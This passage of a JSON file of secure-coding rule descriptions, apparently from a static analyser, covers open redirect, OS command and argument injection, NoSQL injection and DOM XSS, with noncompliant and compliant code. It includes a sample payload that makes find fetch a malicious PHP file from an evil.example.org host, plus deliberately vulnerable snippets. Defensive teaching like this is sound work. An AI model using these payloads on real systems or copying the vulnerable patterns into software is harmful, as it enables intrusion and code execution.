Noncompliant\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nserver.get('/redirect', (request, response) =&gt; {\n\n   if (request.query.url.startsWith(\"https://www.example.com/\")) {\n      response.redirect(request.query.url);\n   }\n});\n</pre>\n<h3>How does this work?</h3>\n<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in\nmethods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following\nalternatives:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>\n  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like\nexisting domains is widespread and is called <a href=\"https://en.wikipedia.org/wiki/Cybersquatting\">Cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S5883": {
        "name": "OS commands should not be vulnerable to argument injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data\nis limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the\nbehavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The\nsecurity of the application depends on the behavior of the application that is executed.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the\ncommand the parameters are added to, this might lead to arbitrary command execution.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Express.js</h2>\n<h3>Code examples</h3>\n<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>\n<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or\nsanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected\nsystem command behavior.</p>\n<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the\nfollowing payload will download malicious software on the application’s hosting server.</p>\n<pre>\n -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nasync function (req, res) {\n    await execa.command('find /tmp/images/' + req.query.id); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nasync function (req, res) {\n    if (req.query.file &amp;&amp; req.query.file.match(/^[A-Z]+$/i)) {\n        await execa('find', ['/tmp/images/' + req.query.file]);\n    } else {\n        await execa('find', ['/tmp/images/']);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid\nusing OS commands in the first place.</p>\n<p>When this is not possible, strict measures should be applied to ensure a secure implementation.</p>\n<p>The proposed compliant solution makes use of the <code>execa</code> method. This one separates the command to run from the arguments passed to it.\nIt also ensures that all arguments passed to the executed command are properly escaped. That way, an attacker with control over a command parameter\nwill not be able to inject arbitrary new ones.</p>\n<p>While this reduces the chances for an attacker to identify an exploitation payload, the highest security level will only be reached by adding an\nadditional validation layer.</p>\n<p>In the current example, an attacker with control over the first parameter of the <code>find</code> command could still be able to inject special\nfile path characters in it. Indeed, passing <code>../../</code> string as a parameter would force the <code>find</code> command to crawl the whole\nfile system. This could lead to a denial of service or sensitive data exposure.</p>\n<p>Here, adding a regular-expression-based validation on the user-controled value prevents this kind of issue. It ensures that the user-submitted\nparameter contains a harmless value.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheat Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "tssecurity:S2076": {
        "name": "OS commands should not be vulnerable to command injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,\nan attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the\nunderlying operating system.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can\nexecute an arbitrary program that is installed on the system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst { execSync } = require('child_process')\n\ncmd = req.query.cmd\nexecSync(cmd) // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst { spawnSync } = require('child_process')\n\nconst cmdId = parseInt(req.query.cmdId)\nlet host = req.query.host\nhost = typeof host === \"string\"? host : \"example.org\"\n\nconst allowedCommands = [\n    {exe:\"/bin/ping\", args:[\"-c\",\"1\",\"--\"]},\n    {exe:\"/bin/host\", args:[\"--\"]}\n]\nconst cmd = allowedCommands[cmdId]\nspawnSync(cmd.exe, cmd.args.concat(host))\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to\navoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some\nsecurity suggestions.</p>\n<h4>Pre-Approved commands</h4>\n<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the\ncleanest way to avoid this problem is to validate the input before using it in an OS command.</p>\n<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>\nIf a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use\nregexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using\n<code>^/bin/(ls|pwd|grep)$</code>.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<p>In the example compliant code, a static list of trusted commands is used. Users are only allowed to submit an index in this array in place of a\nfull command name.</p>\n<h4>Neutralize special characters</h4>\n<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special\nsanitization components, such as <code>child_process.spawn</code>.</p>\n<p>The library helps you to get rid of common dangerous characters, such as:</p>\n<ul>\n  <li> <code>&amp;</code> </li>\n  <li> <code>|</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>$</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>`</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>!</code> </li>\n</ul>\n<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are\nneutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>\n<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be\nterminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a\nhref=\"https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits\">since its version 2.24</a>.</p>\n<p>In the example compliant code, the <code>spawn</code> function from <code>child_process</code> is used in place of its less secure\n<code>exec</code> counterpart. It accepts command arguments as an array and performs a proper escaping of its element before building the command line\nto run.</p>\n<h4>Disable shell integration</h4>\n<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>\n<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system\nshell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be\nused to break out of a command call.</p>\n<p>Therefore, it is generally preferable to disable shell integration.</p>\n<p>The <code>spawn</code> function that is used in the example compliant code disables shell integration by default.</p>\n<h3>Pitfalls</h3>\n<h4>Loose typing</h4>\n<p>Because JavaScript is a loosely typed language, extra care should be taken when accepting user-controlled parameters. Indeed, some methods, that\ncan be used to sanitize untrusted parameters, sometimes accept both objects and object arrays.</p>\n<p>For example, the <code>Array.concat</code> function accepts an array as argument and will append all of its elements to its target. When an\nuntrusted parameter is an array, while a single string was expected, using <code>concat</code> to build a command argument list can result in an\narbitrary argument injection.</p>\n<p>It is therefore of prime importance to check the type of untrusted parameters before processing them.</p>\n<p>In the above compliant code example, the ambiguous <code>concat</code> function is used. However, a type check has been introduced to prevent any\nunexpected issue.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheaty Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S5147": {
        "name": "NoSQL operations should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into\nthe vulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data leakage</h4>\n<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more\ndatabases.<br> This threat is the most widespread impact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>\n<h4>Chaining NoSQL injections with other vulnerabilities</h4>\n<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>\n</ul>\n<h2>How to fix it in MongoDB</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a NoSQL injection because the database query is built using untrusted JavaScript objects that are extracted\nfrom user inputs.</p>\n<p>Here the application assumes the user-submitted parameters are always strings, while they might contain more complex structures. An array or\ndictionary input might tamper with the expected query behavior.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst { MongoClient } = require('mongodb');\n\nfunction (req, res) {\n    let query = { user: req.query.user, city: req.query.city };\n\n    MongoClient.connect(url, (err, db) =&gt; {\n        db.collection(\"users\")\n        .find(query) // Noncompliant\n        .toArray((err, docs) =&gt; { });\n    });\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst { MongoClient } = require('mongodb');\n\nfunction (req, res) {\n    let query = { user: req.query.user.toString(), city: req.query.city.toString() };\n\n    MongoClient.connect(url, (err, db) =&gt; {\n        db.collection(\"users\")\n        .find(query)\n        .toArray((err, docs) =&gt; { });\n    });\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use only plain string values</h4>\n<p>With MongoDB, NoSQL injection can arise when attackers are able to inject objects in the query instead of plain string values. For example, using\nthe object <code>{ $ne: \"\" }</code> in a field of a <code>find</code> query, will return every entry where the field is not empty.</p>\n<p>Some JavaScript application servers enable \"extended\" syntax that serializes URL query parameters into JavaScript objects or arrays. This allows\nattackers to control all the fields of an object. In express.js, this \"extended\" syntax <a\nhref=\"https://expressjs.com/en/4x/api.html#express.urlencoded\">is enabled by default</a>.</p>\n<p>Before using any untrusted value in a MongoDB query, make sure it is a plain string and not a JavaScript object or an array.</p>\n<p>In some cases, this will not be enough to protect against all attacks and strict validation needs to be applied (see the \"Pitfalls\" section)</p>\n<h3>Pitfalls</h3>\n<h4>Code execution</h4>\n<p>When untrusted data is used within query operators such as <code>$where</code>, <code>$accumulator</code>, or <code>$function</code> it usually\nresults in JavaScript code execution vulnerabilities.</p>\n<p>Therefore, untrusted values should not be used inside these query operators unless they are properly validated.</p>\n<p>For more information about MongoDB code execution vulnerabilities, see rule <a href='/coding_rules#rule_key=typescript%3AS5334'>S5334</a>.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/nosql-injections-in-rocket-chat/\">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/943\">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S5696": {
        "name": "DOM updates should not lead to cross-site scripting (XSS) attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>DOM-based cross-site scripting (XSS) occurs in a web application when its client-side logic reads user-controllable data, such as the URL, and then\nuses this data in dangerous functions defined by the browser, such as <code>eval()</code>, without sanitizing it first.</p>\n<p>When well-intentioned users open a link to a page vulnerable to DOM-based XSS, they are exposed to several attacks targeting their browsers.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but also arbitrary code that can\nbe interpreted by the user’s browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting this vulnerability.</p>\n<h4>Website defacement</h4>\n<p>An attacker can use the vulnerability to change the target web application’s content as they see fit. Therefore, they might replace the website’s\noriginal content with inappropriate content, leading to brand and reputation damage for the web application owner. It could additionally be used in\nphishing campaigns, leading to the potential loss of user credentials.</p>\n<h4>User impersonation</h4>\n<p>When a user is logged into a web application and opens a malicious link, the attacker can steal that user’s web session and carry out unauthorized\nactions on their account. If the credentials of a privileged user (such as an administrator) are stolen, the attacker might be able to compromise all\nof the web application’s data.</p>\n<h4>Theft of sensitive data</h4>\n<p>Cross-site scripting allows an attacker to extract the application data of any user that opens their malicious link. Depending on the application,\nthis can include sensitive data such as financial or health information. Furthermore, by injecting malicious code into the web application, it might\nbe possible to record keyboard activity (keylogger) or even request access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers can use cross-site scripting vulnerabilities as a first step to exploit more dangerous\nvulnerabilities.</p>\n<p>For example, suppose that the admin control panel of a web application contains an SQL injection vulnerability. In this case, an attacker could\nfind an XSS vulnerability and send a malicious link to an administrator. Once the administrator opens the link, the SQL injection is exploited, giving\nthe attacker access to all user data stored in the web application.</p>\n<h2>How to fix it in DOM API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to DOM-based cross-site scripting because it uses unsanitized URL parameters to alter the DOM of its webpage.</p>\n<p>Because the user input is not sanitized here and the used DOM property is vulnerable to XSS, it is possible to inject arbitrary code in the user’s\nbrowser through this example.</p>\n<h4>Noncompliant code example</h4>\n<p>The <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML\"><code>Element.innerHTML</code></a> property is used to replace the\ncontents of the <code>root</code> element with user-supplied contents. The <code>innerHTML</code> property does not sanitize its input, thus allowing\nfor code injection.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst rootEl = document.getElementById('root');\nconst queryParams = new URLSearchParams(document.location.search);\nconst input = queryParams.get(\"input\");\n\nrootEl.innerHTML = input; // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>The <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText\"><code>HTMLElement.innerText</code></a> property does not\ncreate DOM elements out of its input, rather treating its input as a string. This makes it a safe alternative to <code>Element.innerHTML</code>\ndepending on the use case.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst rootEl = document.getElementById('root');\nconst queryParams = new URLSearchParams(document.location.search);\nconst input = queryParams.get(\"input\");\n\nrootEl.innerText = input;\n</pre>\n<h3>How does this work?</h3>\n<p>In general, one should limit the use of dangerous properties and methods, such as <code>Element.innerHTML</code> or <code>Document.write()</code>,\nas there exist many ways for an attacker to exploit their usage. Instead, prefer the usage of safe alternatives such as\n<code>HTMLElement.innerText</code> or <code>Node.textContent</code>. Furthermore, frameworks such as React or Vue.js will automatically escape\nvariables used in views, making it much harder to accidentally write vulnerable code.</p>\n<p>If these options are not possible, sanitization of the attacker-controllable input should be preferred.</p>\n<h4>Sanitization of user-supplied data</h4>\n<p>By systematically encoding data that is written to the DOM, it is possible to prevent XSS attacks. In this case, the goal is to leave the data\nintact from the end user’s point of view but make it uninterpretable by web browsers.</p>\n<p>However, selecting an encoding that is guaranteed to be safe can be a complex task. XSS exploitation techniques vary depending on the HTML context\nwhere malicious input is injected. As a result, a combination of HTML encoding, URL encoding and JavaScript escaping may be required, depending on the\ncontext. <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html\">OWASP’s DOM-based XSS Prevention Cheat\nSheet</a> goes into more detail about the required sanitization.</p>\n<p>Though browsers do not yet provide any direct API to do this sanitization, the <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify library</a>\noffers extensive functionality to prevent XSS and has been tested by a large user base.</p>\n<h3>Pitfalls</h3>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>For example, filtering out user inputs based on a denylist will never fully prevent XSS vulnerabilities from being exploited. This practice is\nsometimes used by web application firewalls. Time and time again, malicious users are able to find the exploitation payload that will defeat the\nfilters of these firewalls.</p>\n<p>Another common approach is to parse HTML and strip sensitive HTML tags. Again, this denylist approach is vulnerable by design: maintaining a list\nof sensitive HTML tags is very difficult in the long run.</p>\n<h4>Modification after sanitization</h4>\n<p>Caution should be taken if the user-supplied data is further modified <strong>after</strong> this data was sanitized. Doing so might void the\neffects of sanitization and introduce new XSS vulnerabilities. In general, modification of this data should occur beforehand instead.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy</h4>\n<p>With a defense-in-depth security approach, a <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">Content Security Policy</a> (CSP) can\nbe added through the <code>Content-Security-Policy</code> HTTP header, or using a <code>&lt;meta&gt;</code> element. The CSP aims to mitigate XSS\nattacks by instructing client browsers not to load data that does not meet the application’s security requirements.</p>\n<p>Server administrators can define an allowlist of domains that contain valid scripts, which will prevent malicious scripts (not stored on one of\nthese domains) from being executed. If script execution is not needed on a certain webpage, it can also be blocked altogether.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> <a href=\"http://www.webappsec.org/projects/articles/071105.shtml\">webappsec.org</a> - DOM Based Cross Site Scripting or XSS of the Third Kind\n  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.sonarsource.com/blog/ghost-admin-takeover/\">Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tssecurity:S6105": {
        "name": "DOM updates should not lead to open redirect vulnerabilities",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to build URLs used during redirects.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com/redirect?url=evil.com</code>, to redirect the victim to their evil domain.</p>\n<p>Open redirection is most often used to trick users into browsing to a malicious domain that they believe is safe. As such, attackers commonly use\nopen redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker can use this vulnerability to redirect a user from a trusted domain to a malicious domain controlled by the attacker. At that point,\nthe attacker can perform various attacks, such as phishing.</p>\n<p>Below are some scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Phishing</h4>\n<p>Suppose the attacker creates a malicious website that mirrors the interface of the trusted website. In that case, they can use the open redirect\nvulnerability to lead the user to this malicious site.</p>\n<p>Due to the similarity in the application appearance and the supposedly trustable hyperlink, the user fails to identify that they are browsing on a\nmalicious domain. From here, an attacker can capture the user’s credentials, bypass Multi-Factor Authentication (MFA), and take over the user’s\naccount on the trusted website.</p>\n<h4>Malware distribution</h4>\n<p>By leveraging the domain mirroring technique explained above, the attacker could also create a website that hosts malware. A user who is unaware of\nthe redirection from a trusted website to this malicious website might then download and execute the attacker’s malware. In the worst case, this can\nlead to a complete system compromise for the user.</p>\n<h4>JavaScript injection (XSS)</h4>\n<p>In certain circumstances, an attacker can use DOM-based open redirection to execute JavaScript code. This can lead to further exploitation in the\ntrusted domain and has consequences such as the compromise of the user’s account.</p>\n<h2>How to fix it in DOM API</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<p>The following example is vulnerable to open redirection through the following URL:\n<code>https://example.com/redirect?url=https://evil.com</code>;</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst queryParams = new URLSearchParams(document.location.search);\nconst redirectUrl = queryParams.get(\"url\");\ndocument.location = redirectUrl; // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst queryParams = new URLSearchParams(document.location.search);\nconst redirectUrl = queryParams.get(\"url\");\n\nif (redirectUrl.startsWith(\"https://www.example.com/\")) {\n    document.location = redirectUrl;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Most client-side frameworks, such as <code>Vue.js</code> or <code>React.js</code>, provide built-in redirection methods. Those should be preferred\nas they often provide additional security mechanisms. However, these built-in methods are usually engineered for internal page redirections. Thus,\nthey might not solve the reader’s use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, the following should be done instead:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls.) </li>\n  <li> Using an allowlist approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a dynamic confirmation dialog, warning about the imminent action and requiring manual authorization to proceed to the actual\n  redirection. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of <code>String.startsWith</code> and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator character (i.e., a <code>/</code>) as the last character</strong>.</p>\n<p>When this character is not present, attackers may be able to register a specific domain name that both passes validation and is controlled by\nthem.</p>\n<p>For example, when validating the <code>https://example.com</code> domain, suppose an attacker owns the <code>https://example.evil</code> domain. If\nthe prefix-based validation is implemented incorrectly, they could create a <code>https://example.com.example.evil</code> subdomain to abuse the\nbroken validation.</p>\n<p>The practice of taking over domains that maliciously look like existing domains is widespread and is called 